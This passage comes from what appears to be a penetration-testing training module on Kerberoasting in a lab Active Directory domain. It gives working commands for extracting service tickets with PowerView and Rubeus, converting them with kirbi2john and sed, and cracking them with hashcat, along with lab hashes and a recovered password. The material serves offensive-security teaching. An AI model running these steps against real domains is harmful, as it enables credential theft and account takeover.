\n\n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\n```\n\nWe can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.\n\n#### Placing the Output into a File as .kirbi\n\nKerberoasting - from Windows\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi\n```\n\nNext, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the `kirbi2john.py` tool to extract the Kerberos ticket from the TGS file.\n\n#### Extracting the Kerberos Ticket using kirbi2john.py\n\nKerberoasting - from Windows\n\n```shell-session\ndrxh3kr@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi\n```\n\nThis will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.\n\n#### Modifiying crack_file for Hashcat\n\nKerberoasting - from Windows\n\n```shell-session\ndrxh3kr@htb[/htb]$ sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file > sqldev_tgs_hashcat\n```\n\nNow we can check and confirm that we have a hash that can be fed to Hashcat.\n\n#### Viewing the Prepared Hash\n\nKerberoasting - from Windows\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat sqldev_tgs_hashcat \n\n$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55efeba9d77e4c6c6f524afee5c68dacfcb6607291a20cdfb0ef144055356a7296e33b440754be7f87754ac2e4858348e2aebb7270b2d345047f880e17acc07e27a8f752c372bc83a62d54208d12288893d32afd210191dd3b2c56797bd1a72e35a73a7820be51fbf277b83d8181fff5a05cf21481a7b462ceb01c3761c50952689ed1099827c17c2934131db71bc5142c589cd70ed2ebf57dca3f6226f3b21849529355414433210b8d7bd76fec4eb68a45deebc3e7cc931ed8769328536769123f5040d6771915cdbc6c90164669fac72d23a631fef25804b5c8ec39680a4cc2959929edce34bbee6aff135bcbbb26a41a4b4e88b936896d4662ac849f56d7d68071be139cf4dfaf66497015297f9b44cdaef096c8d00255ec3e62f7105d905d0b2f39cef83db4d812718f95e8c99129f3207b386b4c32f7d57befd411e19c218148d19028eb0103d6be99ae23a454f6f3b0339d00d27879f342598937596cadad068ac3d815952a053f87d87b2584784b9d83050eea9a7c6474cde26c90f4a3546076a40ed374d004c465f654623499ca14e9c11538012cf00dee315e2ed444293822502d7f685022e61f3568e1db25b5cfe5a89b33878b6e3db05e9d91ad63820fcb7d0449e66add13f1efceddda95339db3dc919f1caff9690e54b3e4f9a8cf6998a9f9bf55c7a2ed2c87382e9da60f7ca3c22e08cc359f3ef6f4603a5af2fc28303bf3602ab9bc52026e58c27fb247fd4210f45244fd71484685b837fe9573a53964d54acfde7f963028764e99bea7b77139cb651328e862e43d894638288eace99b6d4f8b6684150db9adc43254143b77f32ebe6fbe309dde3b78305fdf0fe60505f9000b89c67c75ef6dd425e04fbe3a5ebf2d78a11a392d815a29ef48d9457fb6c780eb4cc07dfa68c2e97054788952f5ad92ca8d062e4a68967860302fd9630174af832e599bb5fca9cf341d7a1176868d9073796dffbd48efe99b222f4274e93066de646b3c60d1dd94072dd121dd0706024d11738a75ebeb5b7865a5505220d0f03aea6d359a17f3c5b6424989b31b6e52d1c558393aa34e81204fb107374a8884dcb16f6c59a76a0022004fd921734b8719e8694ba0d7f87eb46f5607af4eb1c681b6b5140dbc94a9ea7f5db6ae4c71fbc1024a25b77ac00bdc549d66373d390643be8f1007930a4124e99d4fcb6177dbd5669fb06170d3b8a75db9928164b55e454d08e77f917b1dd2e648d9c7eb0cb2b8ca0eff8a44d1ea5fdd67e01da79047a4a1406f761f5e3b6944cebed45379ea14e7a027c843fa405c07c8385a2102f07967a7cb4883f44ee72d4aa7a38b2701e77374016a01193f5b178e34f4cf2d8eadf651e162569eb421c74e8d5e0cc1a9fab58a4b9b63babb09efc3427e1667f9c7731bcabe3645986040a7306924df5e6e68655e7b0e2e88e7ce0281e0f554de82d9de6c4d9c8d2a36fce65bbb337a415030ce1d03c00fd9783afb5df0ee8fbabfa358521ad845e6d07fde7d34f2311ebae6e6a119d60d899467a66f997c273d2df73350f2d6c5438e71a057feeab\n```\n\nWe can then run the ticket through Hashcat again and get the cleartext password `database!`.\n\n#### Cracking the Hash with Hashcat\n\nKerberoasting - from Windows\n\n```shell-session\ndrxh3kr@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt \n\n<SNIP>\n\n$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55efeba9d77e4c6c6f524afee5c68dacfcb6607291a20cdfb0ef144055356a7296e33b440754be7f87754ac2e4858348e2aebb7270b2d345047f880e17acc07e27a8f752c372bc83a62d54208d12288893d32afd210191dd3b2c56797bd1a72e35a73a7820be51fbf277b83d8181fff5a05cf21481a7b462ceb01c3761c50952689ed1099827c17c2934131db71bc5142c589cd70ed2ebf57dca3f6226f3b21849529355414433210b8d7bd76fec4eb68a45deebc3e7cc931ed8769328536769123f5040d6771915cdbc6c90164669fac72d23a631fef25804b5c8ec39680a4cc2959929edce34bbee6aff135bcbbb26a41a4b4e88b936896d4662ac849f56d7d68071be139cf4dfaf66497015297f9b44cdaef096c8d00255ec3e62f7105d905d0b2f39cef83db4d812718f95e8c99129f3207b386b4c32f7d57befd411e19c218148d19028eb0103d6be99ae23a454f6f3b0339d00d27879f342598937596cadad068ac3d815952a053f87d87b2584784b9d83050eea9a7c6474cde26c90f4a3546076a40ed374d004c465f654623499ca14e9c11538012cf00dee315e2ed444293822502d7f685022e61f3568e1db25b5cfe5a89b33878b6e3db05e9d91ad63820fcb7d0449e66add13f1efceddda95339db3dc919f1caff9690e54b3e4f9a8cf6998a9f9bf55c7a2ed2c87382e9da60f7ca3c22e08cc359f3ef6f4603a5af2fc28303bf3602ab9bc52026e58c27fb247fd4210f45244fd71484685b837fe9573a53964d54acfde7f963028764e99bea7b77139cb651328e862e43d894638288eace99b6d4f8b6684150db9adc43254143b77f32ebe6fbe309dde3b78305fdf0fe60505f9000b89c67c75ef6dd425e04fbe3a5ebf2d78a11a392d815a29ef48d9457fb6c780eb4cc07dfa68c2e97054788952f5ad92ca8d062e4a68967860302fd9630174af832e599bb5fca9cf341d7a1176868d9073796dffbd48efe99b222f4274e93066de646b3c60d1dd94072dd121dd0706024d11738a75ebeb5b7865a5505220d0f03aea6d359a17f3c5b6424989b31b6e52d1c558393aa34e81204fb107374a8884dcb16f6c59a76a0022004fd921734b8719e8694ba0d7f87eb46f5607af4eb1c681b6b5140dbc94a9ea7f5db6ae4c71fbc1024a25b77ac00bdc549d66373d390643be8f1007930a4124e99d4fcb6177dbd5669fb06170d3b8a75db9928164b55e454d08e77f917b1dd2e648d9c7eb0cb2b8ca0eff8a44d1ea5fdd67e01da79047a4a1406f761f5e3b6944cebed45379ea14e7a027c843fa405c07c8385a2102f07967a7cb4883f44ee72d4aa7a38b2701e77374016a01193f5b178e34f4cf2d8eadf651e162569eb421c74e8d5e0cc1a9fab58a4b9b63babb09efc3427e1667f9c7731bcabe3645986040a7306924df5e6e68655e7b0e2e88e7ce0281e0f554de82d9de6c4d9c8d2a36fce65bbb337a415030ce1d03c00fd9783afb5df0ee8fbabfa358521ad845e6d07fde7d34f2311ebae6e6a119d60d899467a66f997c273d2df73350f2d6c5438e71a057feeab:database!\n                                                 \nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: Kerberos 5, etype 23, TGS-REP\nHash.Target......: $krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965e...7feeab\nTime.Started.....: Thu Feb 24 22:03:03 2022 (8 secs)\nTime.Estimated...: Thu Feb 24 22:03:11 2022 (0 secs)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:  1150.5 kH/s (9.76ms) @ Accel:64 Loops:1 Thr:64 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 8773632/14344385 (61.16%)\nRejected.........: 0/8773632 (0.00%)\nRestore.Point....: 8749056/14344385 (60.99%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: davius -> darjes\n\nStarted: Thu Feb 24 22:03:00 2022\nStopped: Thu Feb 24 22:03:11 2022\n```\n\nIf we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.\n\nNow that we have seen the older, more manual way to perform Kerberoasting from a Windows machine and offline processing, let's look at some quicker ways. Most assessments are time-boxed, and we often need to work as quickly and efficiently as possible, so the above method will likely not be our go-to every time. That being said, it can be useful for us to have other tricks up our sleeves and methodologies in case our automated tools fail or are blocked.\n\n---\n\n## Automated / Tool Based Route\n\nNext, we'll cover two much quicker ways to perform Kerberoasting from a Windows host. First, let's use [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to extract the TGS tickets and convert them to Hashcat format. We can start by enumerating SPN accounts.\n\n#### Using PowerView to Enumerate SPN Accounts\n\nKerberoasting - from Windows\n\n```powershell-session\nPS C:\\htb> Import-Module .\\PowerView.ps1\nPS C:\\htb> Get-DomainUser * -spn | select samaccountname\n\nsamaccountname\n--------------\nadfs\nbackupagent\nkrbtgt\nsqldev\nsqlprod\nsqlqa\nsolarwindsmonitor\n```\n\nFrom here, we could target a specific user and retrieve the TGS ticket in Hashcat format.\n\n#### Using PowerView to Target a Specific User\n\nKerberoasting - from Windows\n\n```powershell-session\nPS C:\\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat\n\nSamAccountName       : sqldev\nDistinguishedName    : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\nTicketByteHexStream  :\nHash                 : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433*$BF9729001\n                       376B63C5CAC933493C58CE7$4029DBBA2566AB4748EDB609CA47A6E7F6E0C10AF50B02D10A6F92349DDE3336018DE177\n                       AB4FF3CE724FB0809CDA9E30703EDDE93706891BCF094FE64387B8A32771C7653D5CFB7A70DE0E45FF7ED6014B5F769F\n                       DC690870416F3866A9912F7374AE1913D83C14AB51E74F200754C011BD11932464BEDA7F1841CCCE6873EBF0EC5215C0\n                       12E1938AEC0E02229F4C707D333BD3F33642172A204054F1D7045AF3303809A3178DD7F3D8C4FB0FBB0BB412F3BD5526\n                       7B1F55879DFB74E2E5D976C4578501E1B8F8484A0E972E8C45F7294DA90581D981B0F177D79759A5E6282D86217A03A9\n                       ADBE5EEB35F3924C84AE22BBF4548D2164477409C5449C61D68E95145DA5456C548796CC30F7D3DDD80C48C84E3A538B\n                       019FB5F6F34B13859613A6132C90B2387F0156F3C3C45590BBC2863A3A042A04507B88FD752505379C42F32A14CB9E44\n                       741E73285052B70C1CE5FF39F894412010BAB8695C8A9BEABC585FC207478CD91AE0AD03037E381C48118F0B65D25847\n                       B3168A1639AF2A534A63CF1BC9B1AF3BEBB4C5B7C87602EEA73426406C3A0783E189795DC9E1313798C370FD39DA53DD\n                       CFF32A45E08D0E88BC69601E71B6BD0B753A10C36DB32A6C9D22F90356E7CD7D768ED484B9558757DE751768C99A64D6\n                       50CA4811D719FC1790BAE8FE5DB0EB24E41FF945A0F2C80B4C87792CA880DF9769ABA2E87A1ECBF416641791E6A762BF\n                       1DCA96DDE99D947B49B8E3DA02C8B35AE3B864531EC5EE08AC71870897888F7C2308CD8D6B820FCEA6F584D1781512AC\n                       089BFEFB3AD93705FDBA1EB070378ABC557FEA0A61CD3CB80888E33C16340344480B4694C6962F66CB7636739EBABED7\n                       CB052E0EAE3D7BEBB1E7F6CF197798FD3F3EF7D5DCD10CCF9B4AB082CB1E199436F3F271E6FA3041EF00D421F4792A0A\n                       DCF770B13EDE5BB6D4B3492E42CCCF208873C5D4FD571F32C4B761116664D9BADF425676125F6BF6C049DD067437858D\n                       0866BE520A2EBFEA077037A59384A825E6AAA99F895A58A53313A86C58D1AA803731A849AE7BAAB37F4380152F790456\n                       37237582F4CA1C5287F39986BB233A34773102CB4EAE80AFFFFEA7B4DCD54C28A824FF225EA336DE28F4141962E21410\n                       D66C5F63920FB1434F87A988C52604286DDAD536DA58F80C4B92858FE8B5FFC19DE1B017295134DFBE8A2A6C74CB46FF\n                       A7762D64399C7E009AA60B8313C12D192AA25D3025CD0B0F81F7D94249B60E29F683B797493C8C2B9CE61B6E3636034E\n                       6DF231C428B4290D1BD32BFE7DC6E7C1E0E30974E0620AE337875A54E4AFF4FD50C4785ADDD59095411B4D94A094E87E\n                       6879C36945B424A86159F1575042CB4998F490E6C1BC8A622FC88574EB2CF80DD01A0B8F19D8F4A67C942D08DCCF23DD\n                       92949F63D3B32817941A4B9F655A1D4C5F74896E2937F13C9BAF6A81B7EEA3F7BC7C192BAE65484E5FCCBEE6DC51ED9F\n                       05864719357F2A223A4C48A9A962C1A90720BBF92A5C9EEB9AC1852BC3A7B8B1186C7BAA063EB0AA90276B5D91AA2495\n                       D29D545809B04EE67D06B017C6D63A261419E2E191FB7A737F3A08A2E3291AB09F95C649B5A71C5C45243D4CEFEF5EED\n                       95DDD138C67495BDC772CFAC1B8EF37A1AFBAA0B73268D2CDB1A71778B57B02DC02628AF11\n```\n\nFinally, we can export all tickets to a CSV file for offline processing.\n\n#### Exporting All Tickets to a CSV File\n\nKerberoasting - from Windows\n\n```powershell-session\nPS C:\\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation\n```\n\n#### Viewing the Contents of the .CSV File\n\nKerberoasting - from Windows\n\n```powershell-session\nPS C:\\htb> cat .\\ilfreight_tgs.csv\n\n\"SamAccountName\",\"DistinguishedName\",\"ServicePrincipalName\",\"TicketByteHexStream\",\"Hash\"\n\"adfs\",\"CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\",\"adfsconnect/azure01.inlanefreight.local\",,\"$krb5tgs$23$*adfs$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local*$59C086008BBE7EAE4E483506632F6EF8$622D9E1DBCB1FF2183482478B5559905E0CCBDEA2B52A5D9F510048481F2A3A4D2CC47345283A9E71D65E1573DCF6F2380A6FFF470722B5DEE704C51FF3A3C2CDB2945CA56F7763E117F04F26CA71EEACED25730FDCB06297ED4076C9CE1A1DBFE961DCE13C2D6455339D0D90983895D882CFA21656E41C3DDDC4951D1031EC8173BEEF9532337135A4CF70AE08F0FB34B6C1E3104F35D9B84E7DF7AC72F514BE2B346954C7F8C0748E46A28CCE765AF31628D3522A1E90FA187A124CA9D5F911318752082FF525B0BE1401FBA745E1\n\n<SNIP>\n```\n\nWe can also use [Rubeus](https://github.com/GhostPack/Rubeus) from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.\n\n#### Using Rubeus\n\nKerberoasting - from Windows\n\n```powershell-session\nPS C:\\htb> .\\Rubeus.exe\n\n<SNIP>\n\nRoasting:\n\n    Perform Kerberoasting:\n        Rubeus.exe kerberoast [[/spn:\"blah/blah\"] | [/spns:C:\\temp\\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps] [/nowrap]\n\n    Perform Kerberoasting, outputting hashes to a file:\n        Rubeus.exe kerberoast /outfile:hashes.txt [[/spn:\"blah/blah\"] | [/spns:C:\\temp\\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps]\n\n    Perform Kerberoasting, outputting hashes in the file output format, but to the console:\n        Rubeus.exe kerberoast /simple [[/spn:\"blah/blah\"] | [/spns:C:\\temp\\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps] [/nowrap]\n\n    Perform Kerberoasting with alternate credentials:\n        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\\USER /credpassword:PASSWORD [/spn:\"blah/blah\"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps] [/nowrap]\n\n    Perform Kerberoasting with an existing TGT:\n        Rubeus.exe kerberoast </spn:\"blah/blah\" | /spns:C:\\temp\\spns.txt> </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]\n\n    Perform Kerberoasting with an existing TGT using an enterprise principal:\n        Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]\n\n    Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:\n        Rubeus.exe kerberoast </ticket:BASE64 | /ticket:FILE.KIRBI> /autoenterprise [/ldaps] [/nowrap]\n\n    Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:\n        Rubeus.exe kerberoast /usetgtdeleg [/ldaps] [/nowrap]\n\n    Perform \"opsec\" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:\n        Rubeus.exe kerberoast /rc4opsec [/ldaps] [/nowrap]\n\n    List statistics about found Kerberoastable accounts without actually sending ticket requests:\n        Rubeus.exe kerberoast /stats [/ldaps] [/nowrap]\n\n    Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):\n        Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/ldaps] [/nowrap]\n\n    Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:\n        Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]\n\n    Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%:\n        Rubeus.exe kerberoast /delay:5000 /jitter:30 [/ldaps] [/nowrap]\n\n    Perform AES Kerberoasting:\n        Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]\n```\n\nAs we can see from scrolling the Rubeus help menu, the tool has a vast number of options for interacting with Kerberos, most of which are out of the scope of this module and will be covered in-depth in later modules on advanced Kerberos attacks. It is worth scrolling through the menu, familiarizing yourself with the options, and reading up on the various other possible tasks. Some options include:\n\n- Performing Kerberoasting and outputting hashes to a file\n- Using alternate credentials\n- Performing Kerberoasting combined with a pass-the-ticket attack\n- Performing \"opsec\" Kerberoasting to filter out AES-enabled accounts\n- Requesting tickets for accounts passwords set between a specific date range\n- Placing a limit on the number of tickets requested\n- Performing AES Kerberoasting\n\n#### Viewing Rubeus's Capabilities\n\n![GIF showcasing the commands supported by Rubeus in a PowerShell terminal.](https://academy.hackthebox.com/storage/modules/143/rubeus_help.png)\n\nWe can first use Rubeus to gather some stats. From the output below, we can see that there are nine Kerberoastable users, seven of which support RC4 encryption for ticket requests and two of which support AES 128/256. More on encryption types later. We also see that all nine accounts had their password set this year (2022 at the time of writing). If we saw any SPN accounts with their passwords set 5 or more years ago, they could be promising targets as they could have a weak password that was set and never changed when the organization was less mature.\n\n#### Using the /stats Flag\n\nKerberoasting - from Windows\n\n```powershell-session\nPS C:\\htb> .\\Rubeus.exe kerberoast /stats\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.0.2\n\n\n[*] Action: Kerberoasting\n\n[*] Listing statistics about target users, no ticket requests being performed.\n[*] Target Domain          : INLANEFREIGHT.LOCAL\n[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'\n\n[*] Total kerberoastable users : 9\n\n\n ------------------------------------------------------------\n | Supported Encryption Type                        | Count |\n ------------------------------------------------------------\n | RC4_HMAC_DEFAULT                                 | 7     |\n | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 2     |\n ------------------------------------------------------------\n\n ----------------------------------\n | Password Last Set Year | Count |\n ----------------------------------\n | 2022                   | 9     |\n ----------------------------------\n```\n\nLet's use Rubeus to request tickets for accounts with the `admincount` attribute set to `1`. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the `/nowrap` flag so that the hash can be more easily copied down for offline cracking using Hashcat. Per the documentation, the \"\"/nowrap\" flag prevents any base64 ticket blobs from being column wrapped for any function\"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.\n\n#### Using the /nowrap Flag\n\nKerberoasting - from Windows\n\n```powershell-session\nPS C:\\htb> .\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.0.2\n\n\n[*] Action: Kerberoasting\n\n[*] NOTICE: AES hashes will be returned for AES-enabled accounts.\n[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.\n\n[*] Target Domain          : INLANEFREIGHT.LOCAL\n[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(admincount=1))'\n\n[*] Total kerberoastable users : 3\n\n\n[*] SamAccountName         : backupagent\n[*] DistinguishedName      : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\n[*] ServicePrincipalName   : backupjob/veam001.inlanefreight.local\n[*] PwdLastSet             : 2/15/2022 2:15:40 PM\n[*] Supported ETypes       : RC4_HMAC_DEFAULT\n[*] Hash                   : $krb5tgs$23$*backupagent$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local@INLANEFREIGHT.LOCAL*$750F377DEFA85A67EA0FE51B0B28F83D$049EE7BF77ABC968169E1DD9E31B8249F509080C1AE6C8575B7E5A71995F345CB583FECC68050445FDBB9BAAA83AC7D553EECC57286F1B1E86CD16CB3266827E2BE2A151EC5845DCC59DA1A39C1BA3784BA8502A4340A90AB1F8D4869318FB0B2BEC2C8B6C688BD78BBF6D58B1E0A0B980826842165B0D88EAB7009353ACC9AD4FE32811101020456356360408BAD166B86DBE6AEB3909DEAE597F8C41A9E4148BD80CFF65A4C04666A977720B954610952AC19EDF32D73B760315FA64ED301947142438B8BCD4D457976987C3809C3320725A708D83151BA0BFF651DFD7168001F0B095B953CBC5FC3563656DF68B61199D04E8DC5AB34249F4583C25AC48FF182AB97D0BF1DE0ED02C286B42C8DF29DA23995DEF13398ACBE821221E8B914F66399CB8A525078110B38D9CC466EE9C7F52B1E54E1E23B48875E4E4F1D35AEA9FBB1ABF1CF1998304A8D90909173C25AE4C466C43886A650A460CE58205FE3572C2BF3C8E39E965D6FD98BF1B8B5D09339CBD49211375AE612978325C7A793EC8ECE71AA34FFEE9BF9BBB2B432ACBDA6777279C3B93D22E83C7D7DCA6ABB46E8CDE1B8E12FE8DECCD48EC5AEA0219DE26C222C808D5ACD2B6BAA35CBFFCD260AE05EFD347EC48213F7BC7BA567FD229A121C4309941AE5A04A183FA1B0914ED532E24344B1F4435EA46C3C72C68274944C4C6D4411E184DF3FE25D49FB5B85F5653AD00D46E291325C5835003C79656B2D85D092DFD83EED3ABA15CE3FD3B0FB2CF7F7DFF265C66004B634B3C5ABFB55421F563FFFC1ADA35DD3CB22063C9DDC163FD101BA03350F3110DD5CAFD6038585B45AC1D482559C7A9E3E690F23DDE5C343C3217707E4E184886D59C677252C04AB3A3FB0D3DD3C3767BE3AE9038D1C48773F986BFEBFA8F38D97B2950F915F536E16E65E2BF67AF6F4402A4A862ED09630A8B9BA4F5B2ACCE568514FDDF90E155E07A5813948ED00676817FC9971759A30654460C5DF4605EE5A92D9DDD3769F83D766898AC5FC7885B6685F36D3E2C07C6B9B2414C11900FAA3344E4F7F7CA4BF7C76A34F01E508BC2C1E6FF0D63AACD869BFAB712E1E654C4823445C6BA447463D48C573F50C542701C68D7DBEEE60C1CFD437EE87CE86149CDC44872589E45B7F9EB68D8E02070E06D8CB8270699D9F6EEDDF45F522E9DBED6D459915420BBCF4EA15FE81EEC162311DB8F581C3C2005600A3C0BC3E16A5BEF00EEA13B97DF8CFD7DF57E43B019AF341E54159123FCEDA80774D9C091F22F95310EA60165C805FED3601B33DA2AFC048DEF4CCCD234CFD418437601FA5049F669FEFD07087606BAE01D88137C994E228796A55675520AB252E900C4269B0CCA3ACE8790407980723D8570F244FE01885B471BF5AC3E3626A357D9FF252FF2635567B4